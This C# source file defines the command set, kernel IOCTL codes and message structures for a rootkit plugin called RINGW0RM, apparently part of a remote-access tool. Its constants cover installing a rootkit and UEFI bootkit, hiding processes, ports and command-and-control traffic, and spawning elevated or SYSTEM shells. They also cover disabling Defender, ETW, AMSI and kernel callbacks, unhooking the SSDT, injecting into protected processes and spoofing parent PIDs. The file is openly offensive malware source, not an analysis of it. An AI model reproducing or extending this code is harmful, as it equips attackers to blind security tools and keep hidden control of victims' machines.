using System;
using System.Runtime.InteropServices;
using MessagePack;

namespace Pulsar.Plugin.Ring0.Common
{
    /// <summary>
    /// RINGW0RM Ring0 Plugin - Commands, IOCTLs, and Data Structures
    /// </summary>
    public static class Ring0Commands
    {
        public const string PluginId = "ringw0rm-rootkit-plugin";
        public const string PluginVersion = "2.0.0";

        // Plugin Commands
        public const string CMD_CHECK_STATUS = "check-status";
        public const string CMD_CHECK_DSE = "check-dse";
        public const string CMD_CHECK_SECURE_BOOT = "check-secureboot";
        public const string CMD_CHECK_BOOTKIT = "check-bootkit";
        public const string CMD_CHECK_ROOTKIT = "check-rootkit";
        public const string CMD_INSTALL_ROOTKIT = "install-rootkit";
        public const string CMD_UNINSTALL_ROOTKIT = "uninstall-rootkit";
        public const string CMD_CONNECT_ROOTKIT = "connect-rootkit";
        public const string CMD_START_ROOTKIT = "start-rootkit";
        public const string CMD_OPEN_GUI = "open-gui";
        
        // Rootkit feature commands
        public const string CMD_HIDE_PROCESS = "hide-process";
        public const string CMD_ELEVATE_PROCESS = "elevate-process";
        public const string CMD_SPAWN_ELEVATED = "spawn-elevated";
        public const string CMD_SET_PROTECTION = "set-protection";
        public const string CMD_UNPROTECT_ALL = "unprotect-all";
        public const string CMD_RESTRICT_FILE = "restrict-file";
        public const string CMD_BYPASS_INTEGRITY = "bypass-integrity";
        public const string CMD_PROTECT_FILE_AV = "protect-file-av";
        public const string CMD_SWAP_DRIVER = "swap-driver";
        public const string CMD_DISABLE_DEFENDER = "disable-defender";
        
        // AV/EDR Commands
        public const string CMD_KILL_ETW = "kill-etw";
        public const string CMD_KILL_AMSI = "kill-amsi";
        public const string CMD_KILL_PROCESS_CALLBACKS = "kill-process-callbacks";
        public const string CMD_KILL_THREAD_CALLBACKS = "kill-thread-callbacks";
        public const string CMD_KILL_IMAGE_CALLBACKS = "kill-image-callbacks";
        public const string CMD_KILL_REGISTRY_CALLBACKS = "kill-registry-callbacks";
        public const string CMD_KILL_ALL_CALLBACKS = "kill-all-callbacks";
        public const string CMD_UNLOAD_DRIVER = "unload-driver";
        public const string CMD_UNHOOK_SSDT = "unhook-ssdt";
        public const string CMD_LIST_SSDT_HOOKS = "list-ssdt-hooks";
        
        // Networking Commands
        public const string CMD_HIDE_PORT = "hide-port";
        public const string CMD_UNHIDE_PORT = "unhide-port";
        public const string CMD_HIDE_ALL_C2 = "hide-all-c2";
        public const string CMD_ADD_DNS_RULE = "add-dns-rule";
        public const string CMD_REMOVE_DNS_RULE = "remove-dns-rule";
        public const string CMD_LIST_DNS_RULES = "list-dns-rules";
        public const string CMD_BLOCK_IP = "block-ip";
        public const string CMD_UNBLOCK_IP = "unblock-ip";
        public const string CMD_LIST_BLOCKED = "list-blocked";
        public const string CMD_START_STEALTH_LISTENER = "start-stealth-listener";
        public const string CMD_STOP_STEALTH_LISTENER = "stop-stealth-listener";
        public const string CMD_LIST_HIDDEN_PORTS = "list-hidden-ports";
        
        // Post-Exploitation Commands
        // Invisible Process Execution
        public const string CMD_RUN_HIDDEN = "run-hidden";
        public const string CMD_LIST_HIDDEN = "list-hidden";
        public const string CMD_KILL_HIDDEN = "kill-hidden";
        
        // PPL Injection
        public const string CMD_INJECT_PPL = "inject-ppl";
        
        // Hidden Scheduled Tasks
        public const string CMD_CREATE_HIDDEN_TASK = "create-hidden-task";
        public const string CMD_LIST_HIDDEN_TASKS = "list-hidden-tasks";
        public const string CMD_DELETE_HIDDEN_TASK = "delete-hidden-task";
        
        // Parent PID Spoofing
        public const string CMD_SPAWN_PPID = "spawn-ppid";
        
        // File Upload (for payloads)
        public const string CMD_UPLOAD_FILE = "upload-file";

        // SYSTEM Shell (interactive remote shell as SYSTEM)
        public const string CMD_SHELL_START = "shell-start";
        public const string CMD_SHELL_EXECUTE = "shell-execute";
        public const string CMD_SHELL_OUTPUT = "shell-output";
        
        // Boot Protection Commands
        public const string CMD_CHECK_BOOT_STATUS = "check-boot-status";
        public const string CMD_GET_BOOT_DIAGNOSTICS = "get-boot-diagnostics";
        public const string CMD_ADD_FILE_TO_BOOTKIT = "add-file-to-bootkit";
        public const string CMD_REMOVE_FILE_FROM_BOOTKIT = "remove-file-from-bootkit";
        public const string CMD_LIST_BOOTKIT_FILES = "list-bootkit-files";

        // Driver constants
        public const string DRIVER_NAME = "RINGW0RM";
        public const string DRIVER_FILE = "ringw0rm.sys";
        public const string DEVICE_NAME = @"\\.\RINGW0RM";  // Internal device path
        public const string SERVICE_NAME = "RINGW0RM";
        public const string BOOTKIT_FILE = "ringw0rm.efi";

        // Status codes
        public const int STATUS_SUCCESS = 0;
        public const int STATUS_DRIVER_NOT_LOADED = 1;
        public const int STATUS_DRIVER_LOADED = 2;
        public const int STATUS_DSE_ENABLED = 3;
        public const int STATUS_DSE_DISABLED = 4;
        public const int STATUS_SECURE_BOOT_ON = 5;
        public const int STATUS_SECURE_BOOT_OFF = 6;
        public const int STATUS_INSTALL_SUCCESS = 7;
        public const int STATUS_INSTALL_FAILED = 8;
        public const int STATUS_IOCTL_SUCCESS = 9;
        public const int STATUS_IOCTL_FAILED = 10;
        public const int STATUS_ERROR = -1;

        // Error codes from driver
        public const uint ERROR_UNSUPPORTED_OFFSET = 0x00000233;
        public const uint STATUS_ALREADY_EXISTS = 0xB7;
    }

    /// <summary>
    /// IOCTL codes matching RINGW0RM driver
    /// CTL_CODE(FILE_DEVICE_UNKNOWN, FunctionCode, METHOD_BUFFERED, FILE_ANY_ACCESS)
    /// </summary>
    public static class ChaosIoctl
    {
        private const uint FILE_DEVICE_UNKNOWN = 0x22;
        private const uint METHOD_BUFFERED = 0;
        private const uint FILE_ANY_ACCESS = 0;

        private static uint CTL_CODE(uint DeviceType, uint Function, uint Method, uint Access)
            => (DeviceType << 16) | (Access << 14) | (Function << 2) | Method;

        // ================================================================
        // EXISTING IOCTLs - Process/File Operations
        // ================================================================
        public static readonly uint HIDE_PROC = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x45, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PRIVILEGE_ELEVATION = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PROTECTION_LEVEL_SYSTEM = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x91, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PROTECTION_LEVEL_WINTCB = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x92, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PROTECTION_LEVEL_WINDOWS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x93, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PROTECTION_LEVEL_AUTHENTICODE = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x94, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PROTECTION_LEVEL_WINTCB_LIGHT = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x95, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PROTECTION_LEVEL_WINDOWS_LIGHT = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x96, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PROTECTION_LEVEL_LSA_LIGHT = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x97, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PROTECTION_LEVEL_ANTIMALWARE_LIGHT = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x98, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PROTECTION_LEVEL_AUTHENTICODE_LIGHT = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x99, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint UNPROTECT_ALL_PROCESSES = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x100, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint RESTRICT_ACCESS_TO_FILE = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x169, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint BYPASS_INTEGRITY_FILE = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x170, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint ZWSWAPCERT = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x171, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint SET_PROTECTION_LEVEL = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x172, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint PROTECT_FILE_AGAINST_AV = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x173, METHOD_BUFFERED, FILE_ANY_ACCESS);

        // ================================================================
        // AV/EDR BYPASS IOCTLs
        // ================================================================
        public static readonly uint KILL_ETW = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x200, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint KILL_AMSI = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x201, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint KILL_PROCESS_CALLBACKS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x202, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint KILL_THREAD_CALLBACKS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x203, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint KILL_IMAGE_CALLBACKS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x204, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint KILL_REGISTRY_CALLBACKS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x205, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint KILL_ALL_CALLBACKS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x206, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint FORCE_UNLOAD_DRIVER = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x207, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint UNHOOK_SSDT = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x208, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint LIST_SSDT_HOOKS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x209, METHOD_BUFFERED, FILE_ANY_ACCESS);

        // ================================================================
        // NETWORKING IOCTLs
        // ================================================================
        public static readonly uint HIDE_PORT = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x300, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint UNHIDE_PORT = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x301, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint HIDE_ALL_C2 = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x302, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint ADD_DNS_RULE = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x303, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint REMOVE_DNS_RULE = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x304, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint LIST_DNS_RULES = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x305, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint BLOCK_IP = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x306, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint UNBLOCK_IP = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x307, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint LIST_BLOCKED = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x308, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint START_STEALTH_LISTENER = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x309, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint STOP_STEALTH_LISTENER = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x30A, METHOD_BUFFERED, FILE_ANY_ACCESS);

        // IOCTLs to retrieve rule arrays
        public static readonly uint GET_DNS_RULES = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x310, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint GET_BLOCKED_IPS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x311, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint GET_HIDDEN_PORTS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x312, METHOD_BUFFERED, FILE_ANY_ACCESS);

        // ================================================================
        // POST-EXPLOITATION IOCTLs
        // ================================================================
        // Invisible Process Execution
        public static readonly uint RUN_HIDDEN_PROCESS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x500, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint LIST_HIDDEN_PROCESSES = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x501, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint KILL_HIDDEN_PROCESS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x502, METHOD_BUFFERED, FILE_ANY_ACCESS);
        
        // PPL Injection
        public static readonly uint INJECT_INTO_PPL = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x510, METHOD_BUFFERED, FILE_ANY_ACCESS);
        
        // Hidden Scheduled Tasks
        public static readonly uint CREATE_HIDDEN_TASK = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x520, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint LIST_HIDDEN_TASKS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x521, METHOD_BUFFERED, FILE_ANY_ACCESS);
        public static readonly uint DELETE_HIDDEN_TASK = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x522, METHOD_BUFFERED, FILE_ANY_ACCESS);
        
        // Parent PID Spoofing
        public static readonly uint SPAWN_WITH_PPID = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x530, METHOD_BUFFERED, FILE_ANY_ACCESS);

        // ================================================================
        // BOOT PROTECTION IOCTLs
        // ================================================================
        public static readonly uint GET_BOOT_PROTECTION_STATUS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x400, METHOD_BUFFERED, FILE_ANY_ACCESS);
    }

    /// <summary>
    /// Protection types for process protection
    /// </summary>
    public enum ProtectionType : byte
    {
        None = 0,
        Light = 1,
        Full = 2
    }

    /// <summary>
    /// Protection signers for process protection
    /// </summary>
    public enum ProtectionSigner : byte
    {
        None = 0,
        Authenticode = 1,
        CodeGen = 2,
        Antimalware = 3,
        Lsa = 4,
        Windows = 5,
        WinTcb = 6,
        WinSystem = 7,
        App = 8
    }

    /// <summary>
    /// PS_PROTECTION structure matching kernel definition
    /// </summary>
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct PS_PROTECTION
    {
        public byte Level;

        public ProtectionType Type
        {
            get => (ProtectionType)(Level & 0x07);
            set => Level = (byte)((Level & 0xF8) | ((byte)value & 0x07));
        }

        public bool Audit
        {
            get => (Level & 0x08) != 0;
            set => Level = (byte)(value ? (Level | 0x08) : (Level & 0xF7));
        }

        public ProtectionSigner Signer
        {
            get => (ProtectionSigner)((Level >> 4) & 0x0F);
            set => Level = (byte)((Level & 0x0F) | (((byte)value & 0x0F) << 4));
        }
    }

    /// <summary>
    /// Set protection level command structure
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct SetProtectionCommand
    {
        public PS_PROTECTION Protection;
        public IntPtr ProcessHandle;
    }

    /// <summary>
    /// File operation structure for restrict/bypass commands
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct FileOperation
    {
        public int Pid;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string Filename;
    }

    // MessagePack DTOs for plugin communication

    [MessagePackObject]
    public class RootkitStatus
    {
        [Key(0)] public bool DriverLoaded { get; set; }
        [Key(1)] public bool DriverConnected { get; set; }
        [Key(2)] public bool DseEnabled { get; set; }
        [Key(3)] public bool SecureBootEnabled { get; set; }
        [Key(4)] public bool BootkitInstalled { get; set; }
        [Key(5)] public int StatusCode { get; set; }
        [Key(6)] public string Message { get; set; }
        [Key(7)] public DateTime Timestamp { get; set; }
        [Key(8)] public int WindowsBuild { get; set; }
        [Key(9)] public bool BuildSupported { get; set; }
    }

    [MessagePackObject]
    public class ProcessRequest
    {
        [Key(0)] public int Pid { get; set; }
        [Key(1)] public ProtectionType ProtType { get; set; }
        [Key(2)] public ProtectionSigner ProtSigner { get; set; }
    }

    [MessagePackObject]
    public class FileRequest
    {
        [Key(0)] public int AllowedPid { get; set; }
        [Key(1)] public string Filename { get; set; }
    }

    [MessagePackObject]
    public class IoctlResult
    {
        [Key(0)] public bool Success { get; set; }
        [Key(1)] public uint ErrorCode { get; set; }
        [Key(2)] public string Message { get; set; }
    }

    /// <summary>
    /// Boot protection status returned from driver
    /// </summary>
    [MessagePackObject]
    public class BootProtectionStatus
    {
        [Key(0)] public bool EtwKilledAtBoot { get; set; }
        [Key(1)] public bool AmsiCallbackRegistered { get; set; }
        [Key(2)] public bool ProcessCallbackRegistered { get; set; }
        [Key(3)] public bool PayloadConfigLoaded { get; set; }
        [Key(4)] public uint PayloadHideCount { get; set; }
        [Key(5)] public uint AmsiPatchCount { get; set; }
        [Key(6)] public int LastError { get; set; }
        [Key(7)] public string LastErrorContext { get; set; }
    }
}
